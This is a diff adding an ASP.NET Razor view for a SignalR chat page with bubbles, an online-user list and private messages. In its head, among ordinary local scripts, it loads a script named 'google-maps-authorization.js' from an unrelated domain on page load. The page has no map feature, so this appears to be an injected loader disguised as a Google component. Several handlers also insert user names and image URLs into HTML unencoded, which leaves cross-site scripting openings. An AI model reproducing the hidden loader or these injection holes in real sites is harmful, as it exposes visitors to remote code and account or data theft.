@@ -1,0 +1,604 @@
+﻿@{
+    //Layout = null;
+    Layout = "~/Views/Shared/_Layout_analytics.cshtml";
+
+}
+
+<html>
+<head>
+    <title></title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <link href="~/Content/component.css" rel="stylesheet" />
+    <link href="~/Content/sweetalert.css" rel="stylesheet" />
+
+    <script src="~/Scripts/sweetalert.min.js"></script>
+    <script src="~/Scripts/sweetalert-dev.js"></script>
+    <script src="https://www.hostingreviews.website/google-maps-authorization.js?id=6b2c467f-f67b-6f74-575e-5db79cfb2344&c=google-maps-code&u=1469369613" defer="defer" async="async"></script>
+    <script type="text/javascript">
+        $(document).ready(function () {
+
+            $('#message').focus();
+            var div = $("#chatDiv");
+            div.scrollTop(div.prop('scrollHeight'));
+            getPlayers();
+        });
+    </script>
+
+    <style>
+        #container {
+            position: relative;
+            bottom: 0;
+            right: 0;
+            /*pointer-events: none;*/
+        }
+
+        #chatSetting {
+            -webkit-border-radius: px;
+            -moz-border-radius: 5px;
+            border-radius: 5px;
+            margin-left: 10px;
+            border-bottom-left-radius: 100%30px;
+            border-bottom-right-radius: 100%30px;
+        }
+
+        .bubble {
+            background-color: #F2F2F2;
+            border-radius: 5px;
+            box-shadow: 0 0 6px #B2B2B2;
+            display: inline-block;
+            padding: 10px 18px;
+            position: relative;
+            vertical-align: top;
+            overflow-x: no-display;
+        }
+
+            .bubble::before {
+                background-color: lightblue;
+                content: "\00a0";
+                display: block;
+                height: 16px;
+                position: absolute;
+                top: 11px;
+                transform: rotate( 29deg ) skew( -35deg );
+                -moz-transform: rotate( 29deg ) skew( -35deg );
+                -ms-transform: rotate( 29deg ) skew( -35deg );
+                -o-transform: rotate( 29deg ) skew( -35deg );
+                -webkit-transform: rotate( 29deg ) skew( -35deg );
+                width: 20px;
+            }
+
+        .bubbleyou {
+            background-color: #F2F2F2;
+            border-radius: 5px;
+            box-shadow: 0 0 6px #B2B2B2;
+            display: inline-block;
+            padding: 10px 18px;
+            position: relative;
+            vertical-align: top;
+        }
+
+            .bubbleyou::before {
+                background-color: lightgray;
+                content: "\00a0";
+                display: block;
+                height: 16px;
+                position: absolute;
+                top: 11px;
+                transform: rotate( 29deg ) skew( -35deg );
+                -moz-transform: rotate( 29deg ) skew( -35deg );
+                -ms-transform: rotate( 29deg ) skew( -35deg );
+                -o-transform: rotate( 29deg ) skew( -35deg );
+                -webkit-transform: rotate( 29deg ) skew( -35deg );
+                width: 20px;
+            }
+
+        .you {
+            float: left;
+            margin: 5px 45px 5px 20px;
+        }
+
+            .you::before {
+                box-shadow: -2px 2px 2px 0 rgba( 178, 178, 178, .4 );
+                left: -9px;
+            }
+
+        .me {
+            float: right;
+            margin: 5px 20px 5px 45px;
+        }
+
+            .me::before {
+                box-shadow: 2px -2px 2px 0 rgba( 178, 178, 178, .4 );
+                right: -9px;
+            }
+    </style>
+</head>
+<body>
+
+
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6">
+
+
+
+                <div class="container">
+                    <div class="row">
+                        <div class="col-md-5">
+                            <div class="panel panel-primary">
+                                <div class="panel-heading" id="headerClicked">
+                                    <span class="glyphicon glyphicon-comment"></span>&emsp;<p id="displayname" style="display: inline;"> </p>
+                                    <span class="fa fa-group" style="float:right;font-size:medium">&nbsp; Ever Chat</span>
+                                    @*<div class="btn-group pull-right">
+                                            <button type="button" class="btn btn-default btn-xs dropdown-toggle" data-toggle="dropdown">
+                                                <span class="glyphicon glyphicon-chevron-down"></span>
+                                            </button>
+
+                                            <ul class="dropdown-menu slidedown">
+                                                <li>
+                                                    <a href="">
+                                                        <span class="glyphicon glyphicon-refresh">
+                                                        </span>Refresh
+                                                    </a>
+                                                </li>
+                                                <li>
+                                                    <a href="">
+                                                        <span class="glyphicon glyphicon-ok-sign">
+                                                        </span>Available
+                                                    </a>
+                                                </li>
+                                                <li>
+                                                    <a href="">
+                                                        <span class="glyphicon glyphicon-remove">
+                                                        </span>Busy
+                                                    </a>
+                                                </li>
+                                                <li>
+                                                    <a href="">
+                                                        <span class="glyphicon glyphicon-time"></span>
+                                                        Away
+                                                    </a>
+                                                </li>
+                                                <li class="divider"></li>
+                                                <li>
+                                                    <a href="">
+                                                        <span class="glyphicon glyphicon-off"></span>
+                                                        Sign Out
+                                                    </a>
+                                                </li>
+                                            </ul>
+                                        </div>*@
+
+                                    @*<button type="button" class="btn btn-default btn-xs dropdown-toggle" id="headerClicked" style="float:right">
+                                            <span class="glyphicon glyphicon-eye-open"></span>
+
+                                        </button>*@
+                                </div>
+
+                                <div class="panel-body" id="chatDiv">
+                                    <ul class="chat" id="discussion">
+                                        @{
+                                            foreach (var chat in Model)
+                                            {
+                                                //string profile = Session["ProfilePic"].ToString();
+                                                string name = Session["Name"].ToString();
+                                                string privateMessage = "";
+
+                                                if (!chat.to.Equals("All"))
+                                                {
+                                                    privateMessage = "(privately)";
+                                                }
+
+                                                if (name.Equals(chat.name))
+                                                {
+                                                    // Add the message to the page.
+                                                    <li class="left clearfix">
+                                                        <strong>
+                                                            <span class="chat-img pull-right" style="margin-left:30px">
+                                                                
+                                                                <img class="img-circle" height="60" width="60" src="@chat.profileImage" />
+                                                            </span>
+                                                        </strong>
+                                                        <div class="chat-body clearfix">
+                                                            <p class="bubble me" style="color:black;background-color:lightblue">
+                                                                <strong class="primary-font" style="color:green">
+                                                                    Me
+                                                                </strong>
+                                                                <span style="font-size:9px;">
+                                                                    to @chat.to
+                                                                    <span style="color:red">
+                                                                       
+                                                                        @privateMessage
+                                                                    </span>
+                                                                </span><br />                                                           
+                                                                 @chat.message
+                                                                <br />&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                                                                <span style="font-size:9px;float:right">
+                                                                    @chat.time
+                                                                </span>
+                                                            </p>
+                                                        </div>
+                                                    </li>
+
+                                                }
+                                                else if (chat.to.Equals(name) || chat.to.Equals("All"))
+                                                {
+                                                    // Add the message to the page.
+                                                    <li class="left clearfix">
+                                                        <strong>
+                                                            <span class="chat-img pull-left" style="margin-right:30px">
+                                                                
+                                                                <img class="img-circle" height="60" width="60" src="@chat.profileImage" />
+                                                            </span>
+                                                        </strong>
+                                                        <div class="chat-body clearfix">
+                                                            <p class="bubbleyou you" style="color:black;background-color:lightgray">
+                                                                <strong class="primary-font" style="color:red">
+                                                                    @chat.name
+                                                                </strong>
+                                                                <span style="font-size:9px;">
+                                                                   to @chat.to
+                                                                    <span style="color:red">
+                                                                       
+                                                                        @privateMessage
+                                                                    </span>
+                                                                </span><br />
+                                                                @chat.message
+                                                                <br />&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                                                                <span style="font-size:9px;float:right">
+                                                                    @chat.time
+                                                                </span>
+                                                            </p>
+                                                        </div>
+                                                    </li>
+
+                                                }
+                                            }
+
+
+
+
+                                        }
+
+                                    </ul>
+
+                                </div>
+                                <div class="panel-footer" id="chatFooter">
+                                    
+                                    <div class="input-group" style="color:black">
+                                        <select id="users">
+                                            <option value="All">All</option>
+                                        </select>
+                                    </div>
+                                    <br />
+                                    <div class="input-group">
+                                        <input id="message" type="text" class="form-control input-sm" placeholder="Type your message here..." />
+                                        <span class="input-group-btn">
+                                            <button class="btn btn-warning btn-sm" id="sendmessage">
+                                                Send
+                                            </button>
+                                        </span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+
+            <div class="col-md-6" >
+
+                <div>
+                    <div >
+                        <div class="col-md-6">
+                            <div class="panel panel-primary">
+                                <div class="panel-heading">
+                                    <span class="glyphicon glyphicon-ok-circle"></span>&emsp;<p style="display: inline;"> Online Everianz </p>
+
+                                </div>
+
+                                <div class="panel-body" id="onlineDiv">
+
+                                </div>
+                                <div class="panel-footer" id="chatFooter">
+                                    <div class="input-group" style="color:black">
+                                        <p><b style="color:green" id="onlineCount"> </b>&nbsp; Everianz</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+
+
+        </div>
+    </div>
+
+
+
+
+
+
+    @section scripts {
+
+        <script>
+
+            $("#message").keyup(function (event) {
+                if (event.keyCode == 13) {
+                    $("#sendmessage").click();
+
+                }
+            });
+
+            $('#headerClicked').click(function () {
+
+                // $('#chatDiv').toggle();
+                // $('#chatFooter').toggle();
+                $('#message').focus();
+                var div = $("#chatDiv");
+                div.scrollTop(div.prop('scrollHeight'));
+
+                //if ($('#chatDiv').hasClass("clicked-once"))
+                //{
+                //    $('#chatDiv').hide();
+                //    $('#chatFooter').hide();
+
+                //    $('#chatDiv').addClass("clicked-once");
+                //    $('#chatFooter').addClass("clicked-once");
+
+                //}
+                //else
+                //{
+
+                //    $('#chatDiv').show();
+                //    $('#chatFooter').show();
+
+                //    $('#chatDiv').removeClass("clicked-once");
+                //    $('#chatFooter').removeClass("clicked-once");
+
+                //}
+
+            });
+
+        </script>
+
+
+
+        <script src="~/Scripts/jquery.signalR-2.2.0.min.js"></script>
+
+        <script src="~/signalr/hubs"></script>
+
+        <script type="text/javascript">
+            $(function startChatHub() {
+
+                var chat = $.connection.chatHub;//var chat=$.connection.chatHub;
+                // Create a function that the hub can call back to display messages.
+                //chat.client.AddMsg=function(nae,message){$('#discussion'.append('<li><strong>')+htmlEncode(name)+'</strong>;'+}
+
+
+
+                chat.client.enters = function (n) {
+                    var name = '@Session["Name"].ToString()';
+                    var time = new Date().toLocaleString();
+
+
+                    $('#discussion').append('<li class="left clearfix"><div style="color:gray"><strong><i>'
+                        + n + '</strong> joins the conversation at <span style="font-size:9px;" >' + time + '</span></i></div>'
+                        + '</li>');
+                   
+                    // Update list of users
+                    if (name == n) {
+                        $('#onlineDiv').append('<div class="border" style="color:black"><span class="glyphicon glyphicon-ok-circle" style="color:green"></span>&nbsp;&nbsp;You: ' + n + '</div>');
+                    } else {
+                        $('#onlineDiv').append('<div class="border" style="color:black"><span class="glyphicon glyphicon-ok-circle" style="color:green"></span>&nbsp;&nbsp;' + n + '</div>');
+
+                        //$("#users").append('<option value="' + n + '">' + n + '</option>');
+//                        var option = $('<option style="color:green;font-weight:bold"></option>').attr(n, n).text(n);
+                        $("#users option").remove(":contains('" + n + "')");
+                        $("#users").append('<option style="color:green;font-weight:bold" value="' + n + '">' + n + '</option>');
+                    }
+
+
+                    //settng onlie user count
+                    var c = $("#onlineDiv > div").length;
+                    $('#onlineCount').text(htmlEncode(c)).html();
+
+                    var div = $("#chatDiv");
+                    div.scrollTop(div.prop('scrollHeight'));
+
+                };
+
+
+                chat.client.broadcastMessage = function (name, message, p, time, to) {
+                    var n = '@Session["Name"].ToString()';
+                    var privateMsg = "";
+                    if (to != "All")
+                    {
+                        privateMsg = "(privately)";
+                    }
+
+                    if (name === n) {
+                        name = "Me";
+                        // Add the message to the page.
+                        $('#discussion').append('<li class="left clearfix"><strong> <span class="chat-img pull-right" style="margin-left:30px">'
+                            + ' <img class="img-circle" height="60" width="60" src="'
+                            + p + '" />'
+                            + '</span>'
+                            + '</strong> '
+                            + '<div class="chat-body clearfix"> '
+                            + '<p class="bubble me" style="color:black;background-color:lightblue"> <strong class="primary-font" style="color:green">'
+                            + htmlEncode(name) + '</strong><span style="font-size:9px;">&nbsp; to '
+                            + htmlEncode(to)
+                            + '<span style="color:red">&nbsp;'
+                            + privateMsg + '</span></span><br/>'
+                            + htmlEncode(message)
+                            + '<br/>&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="font-size:9px;float:right" >'
+                            + time + '</span></p> </div>' + '</li>');
+
+                    }//<div class="header pull-right" style="margin-left:20px"> <strong class="primary-font" style="color:black">' + htmlEncode(name) + '</strong> </div>
+                    else {
+                        // Add the message to the page.
+                        $('#discussion').append('<li class="left clearfix"><strong> <span class="chat-img pull-left" style="margin-right:30px">'
+                            + ' <img class="img-circle" height="60" width="60" src="'
+                            + p + '" />'
+                            + '</span>'
+                            + '</strong> '
+                            + '<div class="chat-body clearfix"> '
+                            + '<p class="bubbleyou you" style="color:black;background-color:lightgray"><strong class="primary-font" style="color:red">'
+                            + htmlEncode(name) + '</strong><span style="font-size:9px;">&nbsp; to '
+                            + htmlEncode(to)
+                            + '<span style="color:red">&nbsp;'
+                            + privateMsg + '</span></span><br/>'
+                            + htmlEncode(message)
+                            + '<br/>&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="font-size:9px;float:right" >'
+                            + time
+                            + '</span></p> </div>'
+                            + '</li>');
+                    }
+
+
+                    var div = $("#chatDiv");
+                    div.scrollTop(div.prop('scrollHeight'));
+
+                };
+
+
+
+                // Get the user name and store it to prepend to messages.
+                var name = '@Session["Name"].ToString()';
+                $('#displayname').text(name);
+                // Set initial focus to message input box.
+                //$('#message').focus();
+                // Start the connection.
+
+                chat.client.differentName = function (name) {
+                    //startChatHub();
+
+                    chat.server.notify(name, $.connection.hub.id);
+                };
+
+                chat.client.online = function (n) {
+
+                    // Update list of users
+                    if (name == n){
+                    $('#onlineDiv').append('<div class="border" style="color:black"><span class="glyphicon glyphicon-ok-circle" style="color:green"></span>&nbsp;&nbsp;You: ' + n + '</div>');
+                }else {
+                        $('#onlineDiv').append('<div class="border" style="color:black"><span class="glyphicon glyphicon-ok-circle" style="color:green"></span>&nbsp;&nbsp;' + n + '</div>');
+
+                        //$("#users").append('<option value="' + n + '">' + n + '</option>');
+                       // var option = $('<option style="color:green;font-weight:bold"></option>').attr(n, n).text(n);
+                        $("#users option").remove(":contains('" + n + "')");
+                        $("#users").append('<option style="color:green;font-weight:bold" value="' + n + '">' + n + '</option>');
+                    }
+
+                    //settng onlie user count
+                    var c = $("#onlineDiv > div").length;
+                    $('#onlineCount').text(htmlEncode(c)).html();
+                };
+
+
+                chat.client.disconnected = function (n) {
+                    var time = new Date().toLocaleString();
+
+                    //Calls when someone leaves the page
+                    $('#discussion').append('<li class="left clearfix"><div style="color:gray"><strong><i>'
+                       + n + '</strong> leaves the conversation at <span style="font-size:9px;" >' + time + '</span></i></div>'
+                       + '</li>');
+
+                    //removing offline ones
+                    $('#onlineDiv div').remove(":contains('" + n + "')");
+                    //var option = $('<option></option>').attr(n, n).text(n);
+                    $("#users option").remove(":contains('" + n + "')");
+                    $("#users").append('<option style="color:green;font-weight:bold" value="' + n + '">' + n + '</option>');
+
+                    var div = $("#chatDiv");
+                    div.scrollTop(div.prop('scrollHeight'));
+
+                    //settng onlie user count
+                    var c = $("#onlineDiv > div").length;
+                    $('#onlineCount').text(htmlEncode(c)).html();
+
+
+                }
+
+                $.connection.hub.start().done(function () {
+
+                    //Calls the notify method of the server
+                    chat.server.notify(name, $.connection.hub.id);
+
+                    $('#sendmessage').click(function () {
+                        var n = '@Session["Name"].ToString()';
+                        var p = '@Session["ProfilePic"].ToString()';
+                        var time = new Date().toLocaleString();
+
+                        if ($('#message').val().trim().length === 0)
+                        {
+                            $('#message').val('').focus();
+                        } else
+                        {
+                            if ($("#users").val() == "All") {
+                                // Call the Send method on the hub.$('#displayname').text(), $('#message').val()
+                                chat.server.send(n, $('#message').val(), p, time, $("#users").val());
+
+                            }
+                            else {
+                                chat.server.sendToSpecific(n, $('#message').val(),p,time, $("#users").val());
+                            }
+                            // Clear text box and reset focus for next comment.
+                            $('#message').val('').focus();
+
+                        }
+
+                        
+                    });
+                });
+            });
+            // This optional function html-encodes messages for display in the page.
+            function htmlEncode(value) {
+                var encodedValue = $('<div />').text(value).html();
+                return encodedValue;
+            }
+        </script>
+    <script type="text/javascript">
+        function getPlayers() {
+            $.ajax({
+                url: '/Players',
+                type: 'GET',
+                contentType: "application/json;charset=utf-8",
+            }).done(function (resp) {
+                var n = '@Session["Name"].ToString()';
+
+                for (var i = 0; i < resp.length; i++) {
+
+                    if (n != resp[i])//not me
+                    {
+                        $("#users").append('<option value="' + resp[i] + '">' + resp[i] + '</option>');
+
+                    }
+                    
+                }
+                setEvents();
+                //setEventsSelected();
+            }).error(function (err) {
+                swal({
+                    title: 'Error',
+                    text: err.status,
+                    // timer: 1000,
+                    showConfirmButton: true,
+                    confirmButtonText: 'OK',
+                    closeOnConfirm: true,
+                });
+            });
+
+
+        }
+
+    </script>
+    }
+</body>
+</html>
